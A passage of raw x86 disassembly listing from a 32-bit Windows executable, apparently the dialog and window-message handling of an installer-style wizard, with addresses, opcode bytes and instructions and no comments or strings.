  4041be:	83 fb 02             	cmp    $0x2,%ebx
  4041c1:	0f 85 fb 00 00 00    	jne    0x4042c2
  4041c7:	6a f0                	push   $0xfffffff0
  4041c9:	57                   	push   %edi
  4041ca:	ff 15 d4 81 40 00    	call   *0x4081d4
  4041d0:	25 00 00 01 21       	and    $0x21010000,%eax
  4041d5:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  4041da:	0f 85 e2 00 00 00    	jne    0x4042c2
  4041e0:	6a 04                	push   $0x4
  4041e2:	57                   	push   %edi
  4041e3:	ff 15 28 82 40 00    	call   *0x408228
  4041e9:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  4041ef:	75 17                	jne    0x404208
  4041f1:	ff 35 38 8a 42 00    	push   0x428a38
  4041f7:	ff 15 10 82 40 00    	call   *0x408210
  4041fd:	89 1d 38 8a 42 00    	mov    %ebx,0x428a38
  404203:	e9 fd 03 00 00       	jmp    0x404605
  404208:	83 fe 11             	cmp    $0x11,%esi
  40420b:	75 11                	jne    0x40421e
  40420d:	55                   	push   %ebp
  40420e:	55                   	push   %ebp
  40420f:	57                   	push   %edi
  404210:	ff 15 40 82 40 00    	call   *0x408240
  404216:	33 c0                	xor    %eax,%eax
  404218:	40                   	inc    %eax
  404219:	e9 0c 04 00 00       	jmp    0x40462a
  40421e:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  404224:	0f 85 98 00 00 00    	jne    0x4042c2
  40422a:	0f b7 f3             	movzwl %bx,%esi
  40422d:	56                   	push   %esi
  40422e:	57                   	push   %edi
  40422f:	ff 15 3c 82 40 00    	call   *0x40823c
  404235:	8b f8                	mov    %eax,%edi
  404237:	3b fd                	cmp    %ebp,%edi
  404239:	74 1d                	je     0x404258
  40423b:	55                   	push   %ebp
  40423c:	55                   	push   %ebp
  40423d:	68 f3 00 00 00       	push   $0xf3
  404242:	57                   	push   %edi
  404243:	ff 15 58 82 40 00    	call   *0x408258
  404249:	57                   	push   %edi
  40424a:	ff 15 d8 81 40 00    	call   *0x4081d8
  404250:	85 c0                	test   %eax,%eax
  404252:	0f 84 d0 03 00 00    	je     0x404628
  404258:	83 fe 01             	cmp    $0x1,%esi
  40425b:	75 03                	jne    0x404260
  40425d:	56                   	push   %esi
  40425e:	eb 2e                	jmp    0x40428e
  404260:	83 fe 03             	cmp    $0x3,%esi
  404263:	75 0c                	jne    0x404271
  404265:	39 2d 90 a3 40 00    	cmp    %ebp,0x40a390
  40426b:	7e 3f                	jle    0x4042ac
  40426d:	6a ff                	push   $0xffffffff
  40426f:	eb 1d                	jmp    0x40428e
  404271:	6a 02                	push   $0x2
  404273:	5f                   	pop    %edi
  404274:	3b f7                	cmp    %edi,%esi
  404276:	75 34                	jne    0x4042ac
  404278:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  40427e:	74 15                	je     0x404295
  404280:	57                   	push   %edi
  404281:	e8 85 d1 ff ff       	call   0x40140b
  404286:	89 3d 20 17 42 00    	mov    %edi,0x421720
  40428c:	6a 78                	push   $0x78
  40428e:	e8 a1 03 00 00       	call   0x404634
  404293:	eb 2d                	jmp    0x4042c2
  404295:	6a 03                	push   $0x3
  404297:	e8 6f d1 ff ff       	call   0x40140b
  40429c:	85 c0                	test   %eax,%eax
  40429e:	75 22                	jne    0x4042c2
  4042a0:	c7 05 20 17 42 00 01 	movl   $0x1,0x421720
  4042a7:	00 00 00 
  4042aa:	eb e0                	jmp    0x40428c
  4042ac:	ff 74 24 30          	push   0x30(%esp)
  4042b0:	53                   	push   %ebx
  4042b1:	68 11 01 00 00       	push   $0x111
  4042b6:	ff 35 38 8a 42 00    	push   0x428a38
  4042bc:	ff 15 58 82 40 00    	call   *0x408258
  4042c2:	ff 74 24 30          	push   0x30(%esp)
  4042c6:	53                   	push   %ebx
  4042c7:	ff 74 24 30          	push   0x30(%esp)
  4042cb:	e8 f2 03 00 00       	call   0x4046c2
  4042d0:	e9 55 03 00 00       	jmp    0x40462a
  4042d5:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4042d9:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4042dd:	3b f1                	cmp    %ecx,%esi
  4042df:	a3 38 2f 42 00       	mov    %eax,0x422f38
  4042e4:	75 4d                	jne    0x404333
  4042e6:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  4042ec:	6a 01                	push   $0x1
  4042ee:	57                   	push   %edi
  4042ef:	89 3d 68 9a 42 00    	mov    %edi,0x429a68
  4042f5:	ff d6                	call   *%esi
  4042f7:	6a 02                	push   $0x2
  4042f9:	57                   	push   %edi
  4042fa:	a3 4c 2f 42 00       	mov    %eax,0x422f4c
  4042ff:	ff d6                	call   *%esi
  404301:	6a ff                	push   $0xffffffff
  404303:	6a 1c                	push   $0x1c
  404305:	57                   	push   %edi
  404306:	a3 18 0f 42 00       	mov    %eax,0x420f18
  40430b:	e8 4b 03 00 00       	call   0x40465b
  404310:	ff 35 48 8a 42 00    	push   0x428a48
  404316:	6a f2                	push   $0xfffffff2
  404318:	57                   	push   %edi
  404319:	ff 15 dc 81 40 00    	call   *0x4081dc
  40431f:	6a 04                	push   $0x4
  404321:	e8 e5 d0 ff ff       	call   0x40140b
  404326:	a3 2c 8a 42 00       	mov    %eax,0x428a2c
  40432b:	33 c0                	xor    %eax,%eax
  40432d:	40                   	inc    %eax
  40432e:	a3 38 2f 42 00       	mov    %eax,0x422f38
  404333:	8b 0d 90 a3 40 00    	mov    0x40a390,%ecx
  404339:	33 ed                	xor    %ebp,%ebp
  40433b:	8b f1                	mov    %ecx,%esi
  40433d:	c1 e6 06             	shl    $0x6,%esi
  404340:	03 35 80 9a 42 00    	add    0x429a80,%esi
  404346:	3b cd                	cmp    %ebp,%ecx
  404348:	7c 3e                	jl     0x404388
  40434a:	83 f8 01             	cmp    $0x1,%eax
  40434d:	75 31                	jne    0x404380
  40434f:	55                   	push   %ebp
  404350:	ff 76 10             	push   0x10(%esi)
  404353:	e8 31 d0 ff ff       	call   0x401389
  404358:	85 c0                	test   %eax,%eax
  40435a:	74 24                	je     0x404380
  40435c:	6a 01                	push   $0x1
  40435e:	55                   	push   %ebp
  40435f:	68 0f 04 00 00       	push   $0x40f
  404364:	ff 35 38 8a 42 00    	push   0x428a38
  40436a:	ff 15 58 82 40 00    	call   *0x408258
  404370:	33 c0                	xor    %eax,%eax
  404372:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  404378:	0f 94 c0             	sete   %al
  40437b:	e9 aa 02 00 00       	jmp    0x40462a
  404380:	39 2e                	cmp    %ebp,(%esi)
  404382:	0f 84 a0 02 00 00    	je     0x404628
  404388:	68 0b 04 00 00       	push   $0x40b
  40438d:	e8 15 03 00 00       	call   0x4046a7
  404392:	a1 38 2f 42 00       	mov    0x422f38,%eax
  404397:	01 05 90 a3 40 00    	add    %eax,0x40a390
  40439d:	c1 e0 06             	shl    $0x6,%eax
  4043a0:	03 f0                	add    %eax,%esi
  4043a2:	a1 90 a3 40 00       	mov    0x40a390,%eax
  4043a7:	3b 05 84 9a 42 00    	cmp    0x429a84,%eax
  4043ad:	75 07                	jne    0x4043b6
  4043af:	6a 01                	push   $0x1
  4043b1:	e8 55 d0 ff ff       	call   0x40140b
  4043b6:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  4043bc:	0f 85 24 02 00 00    	jne    0x4045e6
  4043c2:	a1 84 9a 42 00       	mov    0x429a84,%eax
  4043c7:	39 05 90 a3 40 00    	cmp    %eax,0x40a390
  4043cd:	0f 83 13 02 00 00    	jae    0x4045e6
  4043d3:	ff 76 24             	push   0x24(%esi)
  4043d6:	8b 5e 14             	mov    0x14(%esi),%ebx
  4043d9:	68 00 90 43 00       	push   $0x439000
  4043de:	e8 36 23 00 00       	call   0x406719
  4043e3:	ff 76 20             	push   0x20(%esi)
  4043e6:	68 19 fc ff ff       	push   $0xfffffc19
  4043eb:	57                   	push   %edi
  4043ec:	e8 6a 02 00 00       	call   0x40465b
  4043f1:	ff 76 1c             	push   0x1c(%esi)
  4043f4:	68 1b fc ff ff       	push   $0xfffffc1b
  4043f9:	57                   	push   %edi
  4043fa:	e8 5c 02 00 00       	call   0x40465b
  4043ff:	ff 76 28             	push   0x28(%esi)
  404402:	68 1a fc ff ff       	push   $0xfffffc1a
  404407:	57                   	push   %edi
  404408:	e8 4e 02 00 00       	call   0x40465b
  40440d:	6a 03                	push   $0x3
  40440f:	57                   	push   %edi
  404410:	ff 15 3c 82 40 00    	call   *0x40823c
  404416:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  40441c:	89 44 24 30          	mov    %eax,0x30(%esp)
  404420:	74 08                	je     0x40442a
  404422:	66 81 e3 fd fe       	and    $0xfefd,%bx
  404427:	83 cb 04             	or     $0x4,%ebx
  40442a:	8b cb                	mov    %ebx,%ecx
  40442c:	83 e1 08             	and    $0x8,%ecx
  40442f:	51                   	push   %ecx
  404430:	50                   	push   %eax
  404431:	ff 15 28 82 40 00    	call   *0x408228
  404437:	8b c3                	mov    %ebx,%eax
  404439:	25 00 01 00 00       	and    $0x100,%eax
  40443e:	50                   	push   %eax
  40443f:	ff 74 24 34          	push   0x34(%esp)
  404443:	ff 15 50 82 40 00    	call   *0x408250
  404449:	8b c3                	mov    %ebx,%eax
  40444b:	83 e0 02             	and    $0x2,%eax
  40444e:	50                   	push   %eax
  40444f:	e8 29 02 00 00       	call   0x40467d
  404454:	83 e3 04             	and    $0x4,%ebx
  404457:	53                   	push   %ebx
  404458:	ff 35 18 0f 42 00    	push   0x420f18
  40445e:	ff 15 50 82 40 00    	call   *0x408250
  404464:	3b dd                	cmp    %ebp,%ebx
  404466:	74 03                	je     0x40446b
  404468:	55                   	push   %ebp
  404469:	eb 02                	jmp    0x40446d
  40446b:	6a 01                	push   $0x1
  40446d:	68 60 f0 00 00       	push   $0xf060
  404472:	55                   	push   %ebp
  404473:	57                   	push   %edi
  404474:	ff 15 e0 81 40 00    	call   *0x4081e0
  40447a:	50                   	push   %eax
  40447b:	ff 15 e4 81 40 00    	call   *0x4081e4
  404481:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  404487:	6a 01                	push   $0x1
  404489:	55                   	push   %ebp
  40448a:	68 f4 00 00 00       	push   $0xf4
  40448f:	ff 74 24 3c          	push   0x3c(%esp)
  404493:	ff d3                	call   *%ebx
  404495:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  40449b:	74 13                	je     0x4044b0
  40449d:	55                   	push   %ebp
  40449e:	6a 02                	push   $0x2
  4044a0:	68 01 04 00 00       	push   $0x401
  4044a5:	57                   	push   %edi
  4044a6:	ff d3                	call   *%ebx
  4044a8:	ff 35 18 0f 42 00    	push   0x420f18
  4044ae:	eb 06                	jmp    0x4044b6
  4044b0:	ff 35 4c 2f 42 00    	push   0x422f4c
  4044b6:	e8 d5 01 00 00       	call   0x404690
  4044bb:	e8 7d fc ff ff       	call   0x40413d
  4044c0:	bb 50 2f 42 00       	mov    $0x422f50,%ebx
  4044c5:	50                   	push   %eax
  4044c6:	53                   	push   %ebx
  4044c7:	e8 10 22 00 00       	call   0x4066dc
  4044cc:	ff 76 18             	push   0x18(%esi)
  4044cf:	53                   	push   %ebx
  4044d0:	e8 1d 22 00 00       	call   0x4066f2
  4044d5:	8d 04 45 50 2f 42 00 	lea    0x422f50(,%eax,2),%eax
  4044dc:	50                   	push   %eax
  4044dd:	e8 37 22 00 00       	call   0x406719
  4044e2:	53                   	push   %ebx
  4044e3:	57                   	push   %edi
  4044e4:	ff 15 1c 82 40 00    	call   *0x40821c
  4044ea:	55                   	push   %ebp
  4044eb:	ff 76 08             	push   0x8(%esi)
  4044ee:	e8 96 ce ff ff       	call   0x401389
  4044f3:	85 c0                	test   %eax,%eax
  4044f5:	0f 85 97 fe ff ff    	jne    0x404392
  4044fb:	39 2e                	cmp    %ebp,(%esi)
  4044fd:	0f 84 8f fe ff ff    	je     0x404392
  404503:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  404507:	75 1d                	jne    0x404526
  404509:	39 2d ec 9a 42 00    	cmp    %ebp,0x429aec
  40450f:	0f 85 13 01 00 00    	jne    0x404628
  404515:	39 2d e0 9a 42 00    	cmp    %ebp,0x429ae0
  40451b:	0f 85 71 fe ff ff    	jne    0x404392
  404521:	e9 02 01 00 00       	jmp    0x404628
  404526:	ff 35 38 8a 42 00    	push   0x428a38
  40452c:	ff 15 10 82 40 00    	call   *0x408210
  404532:	89 35 28 1f 42 00    	mov    %esi,0x421f28
  404538:	39 2e                	cmp    %ebp,(%esi)
  40453a:	0f 8e c5 00 00 00    	jle    0x404605
  404540:	8b 46 04             	mov    0x4(%esi),%eax
  404543:	56                   	push   %esi
  404544:	ff 34 85 94 a3 40 00 	push   0x40a394(,%eax,4)
  40454b:	66 8b 06             	mov    (%esi),%ax
  40454e:	66 03 05 40 8a 42 00 	add    0x428a40,%ax
  404555:	57                   	push   %edi
  404556:	0f b7 c0             	movzwl %ax,%eax
  404559:	50                   	push   %eax
  40455a:	ff 35 60 9a 42 00    	push   0x429a60
  404560:	ff 15 14 82 40 00    	call   *0x408214
  404566:	3b c5                	cmp    %ebp,%eax
  404568:	a3 38 8a 42 00       	mov    %eax,0x428a38
  40456d:	0f 84 92 00 00 00    	je     0x404605
  404573:	ff 76 2c             	push   0x2c(%esi)
  404576:	6a 06                	push   $0x6
  404578:	50                   	push   %eax
  404579:	e8 dd 00 00 00       	call   0x40465b
  40457e:	8d 44 24 10          	lea    0x10(%esp),%eax
  404582:	50                   	push   %eax
  404583:	68 fa 03 00 00       	push   $0x3fa
  404588:	57                   	push   %edi
  404589:	ff 15 3c 82 40 00    	call   *0x40823c
  40458f:	50                   	push   %eax
  404590:	ff 15 e8 81 40 00    	call   *0x4081e8
  404596:	8d 44 24 10          	lea    0x10(%esp),%eax
  40459a:	50                   	push   %eax
  40459b:	57                   	push   %edi
  40459c:	ff 15 ec 81 40 00    	call   *0x4081ec
  4045a2:	6a 15                	push   $0x15
  4045a4:	55                   	push   %ebp
  4045a5:	55                   	push   %ebp
  4045a6:	ff 74 24 20          	push   0x20(%esp)
  4045aa:	ff 74 24 20          	push   0x20(%esp)
  4045ae:	55                   	push   %ebp
  4045af:	ff 35 38 8a 42 00    	push   0x428a38
  4045b5:	ff 15 d0 81 40 00    	call   *0x4081d0
  4045bb:	55                   	push   %ebp
  4045bc:	ff 76 0c             	push   0xc(%esi)
  4045bf:	e8 c5 cd ff ff       	call   0x401389
  4045c4:	39 2d 2c 8a 42 00    	cmp    %ebp,0x428a2c
  4045ca:	75 5c                	jne    0x404628
  4045cc:	6a 08                	push   $0x8
  4045ce:	ff 35 38 8a 42 00    	push   0x428a38
  4045d4:	ff 15 28 82 40 00    	call   *0x408228
  4045da:	68 05 04 00 00       	push   $0x405
  4045df:	e8 c3 00 00 00       	call   0x4046a7
  4045e4:	eb 1f                	jmp    0x404605
  4045e6:	ff 35 38 8a 42 00    	push   0x428a38
  4045ec:	ff 15 10 82 40 00    	call   *0x408210
  4045f2:	ff 35 20 17 42 00    	push   0x421720
  4045f8:	89 2d 68 9a 42 00    	mov    %ebp,0x429a68
  4045fe:	57                   	push   %edi
  4045ff:	ff 15 f0 81 40 00    	call   *0x4081f0
  404605:	39 2d 50 4f 42 00    	cmp    %ebp,0x424f50
  40460b:	75 1b                	jne    0x404628
  40460d:	39 2d 38 8a 42 00    	cmp    %ebp,0x428a38
  404613:	74 13                	je     0x404628
  404615:	6a 0a                	push   $0xa
  404617:	57                   	push   %edi
  404618:	ff 15 28 82 40 00    	call   *0x408228
  40461e:	c7 05 50 4f 42 00 01 	movl   $0x1,0x424f50
  404625:	00 00 00 
  404628:	33 c0                	xor    %eax,%eax
  40462a:	5f                   	pop    %edi
  40462b:	5e                   	pop    %esi
  40462c:	5d                   	pop    %ebp
  40462d:	5b                   	pop    %ebx
  40462e:	83 c4 10             	add    $0x10,%esp
  404631:	c2 10 00             	ret    $0x10
  404634:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  404639:	75 06                	jne    0x404641
  40463b:	ff 05 2c 8a 42 00    	incl   0x428a2c
  404641:	6a 00                	push   $0x0
  404643:	ff 74 24 08          	push   0x8(%esp)
  404647:	68 08 04 00 00       	push   $0x408
  40464c:	ff 35 68 9a 42 00    	push   0x429a68
  404652:	ff 15 58 82 40 00    	call   *0x408258
  404658:	c2 04 00             	ret    $0x4
  40465b:	ff 74 24 0c          	push   0xc(%esp)
  40465f:	6a 00                	push   $0x0
  404661:	e8 b3 20 00 00       	call   0x406719
  404666:	50                   	push   %eax
  404667:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40466b:	05 e8 03 00 00       	add    $0x3e8,%eax
  404670:	50                   	push   %eax
  404671:	ff 74 24 0c          	push   0xc(%esp)
  404675:	e8 a0 16 00 00       	call   0x405d1a
  40467a:	c2 0c 00             	ret    $0xc
  40467d:	ff 74 24 04          	push   0x4(%esp)
  404681:	ff 35 4c 2f 42 00    	push   0x422f4c
  404687:	ff 15 50 82 40 00    	call   *0x408250
  40468d:	c2 04 00             	ret    $0x4
  404690:	6a 01                	push   $0x1
  404692:	ff 74 24 08          	push   0x8(%esp)
  404696:	6a 28                	push   $0x28
  404698:	ff 35 68 9a 42 00    	push   0x429a68
  40469e:	ff 15 58 82 40 00    	call   *0x408258
  4046a4:	c2 04 00             	ret    $0x4
  4046a7:	a1 38 8a 42 00       	mov    0x428a38,%eax
  4046ac:	85 c0                	test   %eax,%eax
  4046ae:	74 0f                	je     0x4046bf
  4046b0:	6a 00                	push   $0x0
  4046b2:	6a 00                	push   $0x0
  4046b4:	ff 74 24 0c          	push   0xc(%esp)
  4046b8:	50                   	push   %eax
  4046b9:	ff 15 58 82 40 00    	call   *0x408258
  4046bf:	c2 04 00             	ret    $0x4
  4046c2:	55                   	push   %ebp
  4046c3:	8b ec                	mov    %esp,%ebp
  4046c5:	83 ec 0c             	sub    $0xc,%esp
  4046c8:	8b 45 08             	mov    0x8(%ebp),%eax
  4046cb:	56                   	push   %esi
  4046cc:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  4046d1:	83 f8 05             	cmp    $0x5,%eax
  4046d4:	0f 87 b0 00 00 00    	ja     0x40478a
  4046da:	6a eb                	push   $0xffffffeb
  4046dc:	ff 75 10             	push   0x10(%ebp)
  4046df:	ff 15 d4 81 40 00    	call   *0x4081d4
  4046e5:	8b f0                	mov    %eax,%esi
  4046e7:	85 f6                	test   %esi,%esi
  4046e9:	0f 84 9b 00 00 00    	je     0x40478a
  4046ef:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  4046f3:	0f 87 91 00 00 00    	ja     0x40478a
  4046f9:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  4046fd:	0f 87 87 00 00 00    	ja     0x40478a
  404703:	8b 4e 14             	mov    0x14(%esi),%ecx
  404706:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  40470c:	75 7c                	jne    0x40478a
  40470e:	8b 06                	mov    (%esi),%eax
  404710:	57                   	push   %edi
  404711:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  404717:	f6 c1 02             	test   $0x2,%cl
  40471a:	74 03                	je     0x40471f
  40471c:	50                   	push   %eax
  40471d:	ff d7                	call   *%edi
  40471f:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  404723:	74 0a                	je     0x40472f
  404725:	50                   	push   %eax
  404726:	ff 75 0c             	push   0xc(%ebp)
  404729:	ff 15 64 80 40 00    	call   *0x408064
  40472f:	ff 76 10             	push   0x10(%esi)
  404732:	ff 75 0c             	push   0xc(%ebp)
  404735:	ff 15 60 80 40 00    	call   *0x408060
  40473b:	8b 46 04             	mov    0x4(%esi),%eax
  40473e:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404742:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404745:	74 06                	je     0x40474d
  404747:	50                   	push   %eax
  404748:	ff d7                	call   *%edi
  40474a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40474d:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  404751:	5f                   	pop    %edi
  404752:	74 0a                	je     0x40475e
  404754:	50                   	push   %eax
  404755:	ff 75 0c             	push   0xc(%ebp)
  404758:	ff 15 4c 80 40 00    	call   *0x40804c
  40475e:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404762:	74 21                	je     0x404785
  404764:	8b 46 08             	mov    0x8(%esi),%eax
  404767:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40476a:	8b 46 0c             	mov    0xc(%esi),%eax
  40476d:	85 c0                	test   %eax,%eax
  40476f:	74 07                	je     0x404778
  404771:	50                   	push   %eax
  404772:	ff 15 54 80 40 00    	call   *0x408054
  404778:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40477b:	50                   	push   %eax
  40477c:	ff 15 58 80 40 00    	call   *0x408058
  404782:	89 46 0c             	mov    %eax,0xc(%esi)
  404785:	8b 46 0c             	mov    0xc(%esi),%eax
  404788:	eb 02                	jmp    0x40478c
  40478a:	33 c0                	xor    %eax,%eax
  40478c:	5e                   	pop    %esi
  40478d:	c9                   	leave
  40478e:	c2 0c 00             	ret    $0xc
  404791:	55                   	push   %ebp
  404792:	8b ec                	mov    %esp,%ebp
  404794:	8b 45 10             	mov    0x10(%ebp),%eax
  404797:	8b 0d 1c 0f 42 00    	mov    0x420f1c,%ecx
  40479d:	d1 e8                	shr    $1,%eax
  40479f:	50                   	push   %eax
  4047a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4047a3:	03 c8                	add    %eax,%ecx
  4047a5:	51                   	push   %ecx
  4047a6:	ff 75 0c             	push   0xc(%ebp)
  4047a9:	ff 15 94 80 40 00    	call   *0x408094
  4047af:	ff 75 0c             	push   0xc(%ebp)
  4047b2:	ff 15 98 80 40 00    	call   *0x408098
  4047b8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4047bb:	03 c0                	add    %eax,%eax
  4047bd:	89 01                	mov    %eax,(%ecx)
  4047bf:	01 05 1c 0f 42 00    	add    %eax,0x420f1c
  4047c5:	33 c0                	xor    %eax,%eax
  4047c7:	5d                   	pop    %ebp
  4047c8:	c2 10 00             	ret    $0x10
  4047cb:	55                   	push   %ebp
  4047cc:	8b ec                	mov    %esp,%ebp
  4047ce:	a1 1c 0f 42 00       	mov    0x420f1c,%eax
  4047d3:	56                   	push   %esi
  4047d4:	8b 75 08             	mov    0x8(%ebp),%esi
  4047d7:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4047da:	50                   	push   %eax
  4047db:	ff 15 98 80 40 00    	call   *0x408098
  4047e1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4047e4:	d1 e9                	shr    $1,%ecx
  4047e6:	3b c1                	cmp    %ecx,%eax
  4047e8:	72 02                	jb     0x4047ec
  4047ea:	8b c1                	mov    %ecx,%eax
  4047ec:	33 c9                	xor    %ecx,%ecx
  4047ee:	51                   	push   %ecx
  4047ef:	51                   	push   %ecx
  4047f0:	ff 75 10             	push   0x10(%ebp)
  4047f3:	ff 75 0c             	push   0xc(%ebp)
  4047f6:	50                   	push   %eax
  4047f7:	a1 1c 0f 42 00       	mov    0x420f1c,%eax
  4047fc:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4047ff:	50                   	push   %eax
  404800:	51                   	push   %ecx
  404801:	51                   	push   %ecx
  404802:	ff 15 90 80 40 00    	call   *0x408090
  404808:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40480b:	5e                   	pop    %esi
  40480c:	89 01                	mov    %eax,(%ecx)
  40480e:	01 05 1c 0f 42 00    	add    %eax,0x420f1c
  404814:	33 c0                	xor    %eax,%eax
  404816:	5d                   	pop    %ebp
  404817:	c2 10 00             	ret    $0x10
  40481a:	55                   	push   %ebp
  40481b:	8b ec                	mov    %esp,%ebp
  40481d:	83 ec 0c             	sub    $0xc,%esp
  404820:	53                   	push   %ebx
  404821:	33 db                	xor    %ebx,%ebx
  404823:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40482a:	56                   	push   %esi
  40482b:	57                   	push   %edi
  40482c:	0f 85 1a 01 00 00    	jne    0x40494c
  404832:	8b 7d 14             	mov    0x14(%ebp),%edi
  404835:	8b 47 30             	mov    0x30(%edi),%eax
  404838:	3b c3                	cmp    %ebx,%eax
  40483a:	7d 11                	jge    0x40484d
  40483c:	8b 0d 3c 8a 42 00    	mov    0x428a3c,%ecx
  404842:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  404849:	2b c8                	sub    %eax,%ecx
  40484b:	8b 01                	mov    (%ecx),%eax
  40484d:	8b 0d 98 9a 42 00    	mov    0x429a98,%ecx
  404853:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  404856:	0f b7 08             	movzwl (%eax),%ecx
  404859:	40                   	inc    %eax
  40485a:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40485d:	40                   	inc    %eax
  40485e:	83 f9 02             	cmp    $0x2,%ecx
  404861:	89 45 14             	mov    %eax,0x14(%ebp)
  404864:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404867:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40486a:	c7 45 fc cb 47 40 00 	movl   $0x4047cb,-0x4(%ebp)
  404871:	74 07                	je     0x40487a
  404873:	c7 45 fc 91 47 40 00 	movl   $0x404791,-0x4(%ebp)
  40487a:	8b 47 14             	mov    0x14(%edi),%eax
  40487d:	ff 77 34             	push   0x34(%edi)
  404880:	8b f0                	mov    %eax,%esi
  404882:	83 e0 01             	and    $0x1,%eax
  404885:	f7 d6                	not    %esi
  404887:	c1 ee 05             	shr    $0x5,%esi
  40488a:	6a 22                	push   $0x22
  40488c:	83 e6 01             	and    $0x1,%esi
  40488f:	ff 75 08             	push   0x8(%ebp)
  404892:	0b f0                	or     %eax,%esi
  404894:	e8 c2 fd ff ff       	call   0x40465b
  404899:	ff 77 38             	push   0x38(%edi)
  40489c:	6a 23                	push   $0x23
  40489e:	ff 75 08             	push   0x8(%ebp)
  4048a1:	e8 b5 fd ff ff       	call   0x40465b
  4048a6:	33 c0                	xor    %eax,%eax
  4048a8:	3b f3                	cmp    %ebx,%esi
  4048aa:	0f 94 c0             	sete   %al
  4048ad:	05 0a 04 00 00       	add    $0x40a,%eax
  4048b2:	6a 01                	push   $0x1
  4048b4:	50                   	push   %eax
  4048b5:	ff 75 08             	push   0x8(%ebp)
  4048b8:	ff 15 c0 81 40 00    	call   *0x4081c0
  4048be:	56                   	push   %esi
  4048bf:	e8 b9 fd ff ff       	call   0x40467d
  4048c4:	68 e8 03 00 00       	push   $0x3e8
  4048c9:	ff 75 08             	push   0x8(%ebp)
  4048cc:	ff 15 3c 82 40 00    	call   *0x40823c
  4048d2:	8b f8                	mov    %eax,%edi
  4048d4:	57                   	push   %edi
  4048d5:	e8 b6 fd ff ff       	call   0x404690
  4048da:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4048e0:	53                   	push   %ebx
  4048e1:	6a 01                	push   $0x1
  4048e3:	68 5b 04 00 00       	push   $0x45b
  4048e8:	57                   	push   %edi
  4048e9:	ff d6                	call   *%esi
  4048eb:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4048f0:	8b 40 68             	mov    0x68(%eax),%eax
  4048f3:	3b c3                	cmp    %ebx,%eax
  4048f5:	7d 09                	jge    0x404900
  4048f7:	f7 d8                	neg    %eax
  4048f9:	50                   	push   %eax
  4048fa:	ff 15 cc 81 40 00    	call   *0x4081cc
  404900:	50                   	push   %eax
  404901:	53                   	push   %ebx
  404902:	68 43 04 00 00       	push   $0x443
  404907:	57                   	push   %edi
  404908:	ff d6                	call   *%esi
  40490a:	68 00 00 01 04       	push   $0x4010000
  40490f:	53                   	push   %ebx
  404910:	68 45 04 00 00       	push   $0x445
  404915:	57                   	push   %edi
  404916:	ff d6                	call   *%esi
  404918:	ff 75 14             	push   0x14(%ebp)
  40491b:	e8 d2 1d 00 00       	call   0x4066f2
  404920:	50                   	push   %eax
  404921:	53                   	push   %ebx
  404922:	68 35 04 00 00       	push   $0x435
  404927:	57                   	push   %edi
  404928:	ff d6                	call   *%esi
  40492a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40492d:	89 1d 1c 0f 42 00    	mov    %ebx,0x420f1c
  404933:	50                   	push   %eax
  404934:	ff 75 0c             	push   0xc(%ebp)
  404937:	68 49 04 00 00       	push   $0x449
  40493c:	57                   	push   %edi
  40493d:	ff d6                	call   *%esi
  40493f:	89 1d 1c 0f 42 00    	mov    %ebx,0x420f1c
  404945:	33 c0                	xor    %eax,%eax
  404947:	e9 52 01 00 00       	jmp    0x404a9e
  40494c:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404953:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404959:	75 5b                	jne    0x4049b6
  40495b:	8b 45 10             	mov    0x10(%ebp),%eax
  40495e:	c1 e8 10             	shr    $0x10,%eax
  404961:	66 85 c0             	test   %ax,%ax
  404964:	0f 85 25 01 00 00    	jne    0x404a8f
  40496a:	39 1d 1c 0f 42 00    	cmp    %ebx,0x420f1c
  404970:	0f 85 19 01 00 00    	jne    0x404a8f
  404976:	a1 28 1f 42 00       	mov    0x421f28,%eax
  40497b:	8d 78 14             	lea    0x14(%eax),%edi
  40497e:	f6 07 20             	testb  $0x20,(%edi)
  404981:	0f 84 08 01 00 00    	je     0x404a8f
  404987:	53                   	push   %ebx
  404988:	53                   	push   %ebx
  404989:	68 f0 00 00 00       	push   $0xf0
  40498e:	68 0a 04 00 00       	push   $0x40a
  404993:	ff 75 08             	push   0x8(%ebp)
  404996:	ff 15 3c 82 40 00    	call   *0x40823c
